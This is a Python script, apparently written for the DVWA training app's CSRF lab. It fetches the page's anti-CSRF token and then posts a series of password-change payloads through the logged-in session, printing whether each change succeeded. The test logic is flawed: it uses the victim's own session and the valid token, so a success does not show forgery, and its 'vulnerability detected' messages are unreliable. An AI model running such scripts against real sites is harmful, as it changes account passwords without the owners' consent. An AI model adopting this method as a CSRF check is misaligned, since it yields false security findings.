import requests
from bs4 import BeautifulSoup

def check_csrf(session, base_url):
    csrf_url = base_url + "vulnerabilities/csrf/"
    change_password_url = base_url + "vulnerabilities/csrf/"
    
    try:
        # Navigate to the CSRF page to get the CSRF token
        response = session.get(csrf_url)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Debug: Print the page content to see what's being returned
        print("CSRF Page Content:")
        print(soup.prettify())
        
        # Attempt to find the user_token input field or other relevant token
        user_token_input = soup.find('input', {'name': 'user_token'})
        
        # Handle case where user_token is not found
        if user_token_input is None:
            print("CSRF token not found as 'user_token'. Attempting alternative token name 'token'.")
            user_token_input = soup.find('input', {'name': 'token'})
            
        # If still not found, skip token usage
        if user_token_input is not None:
            user_token = user_token_input['value'] # type: ignore
        else:
            print("No CSRF token found. Proceeding without token.")
            user_token = None
        
        # Define multiple payloads for testing different CSRF scenarios
        payloads = [
            {'password_new': 'newpassword1', 'password_conf': 'newpassword1', 'Change': 'Change'},
            {'password_new': 'password123', 'password_conf': 'password123', 'Change': 'Change'},
            {'password_new': 'admin123', 'password_conf': 'admin123', 'Change': 'Change'},
            {'password_new': 'P@ssw0rd!', 'password_conf': 'P@ssw0rd!', 'Change': 'Change'},
            {'password_new': '12345678', 'password_conf': '12345678', 'Change': 'Change'},
            {'password_new': 'password', 'password_conf': 'password', 'Change': 'Change'},
            {'password_new': 'qwerty', 'password_conf': 'qwerty', 'Change': 'Change'},
            {'password_new': 'letmein', 'password_conf': 'letmein', 'Change': 'Change'},
            {'password_new': 'aaaaaaaa', 'password_conf': 'aaaaaaaa', 'Change': 'Change'},
            {'password_new': 'short', 'password_conf': 'short', 'Change': 'Change'},
            {'password_new': 'a'*100, 'password_conf': 'a'*100, 'Change': 'Change'}
        ]
        
        if user_token:
            for payload in payloads:
                payload['user_token'] = user_token # type: ignore
        
        # Perform the CSRF attack with each payload
        for i, payload in enumerate(payloads):
            print(f"Testing payload {i+1}: {payload}")
            response = session.post(change_password_url, data=payload)
            
            if "Password Changed" in response.text:
                print(f"CSRF vulnerability detected with payload {i+1}. Password was changed without user consent.")
            else:
                print(f"CSRF vulnerability not detected with payload {i+1}. Password change failed or required user interaction.")
    
    except Exception as e:
        print(f"An error occurred while testing for CSRF: {e}")

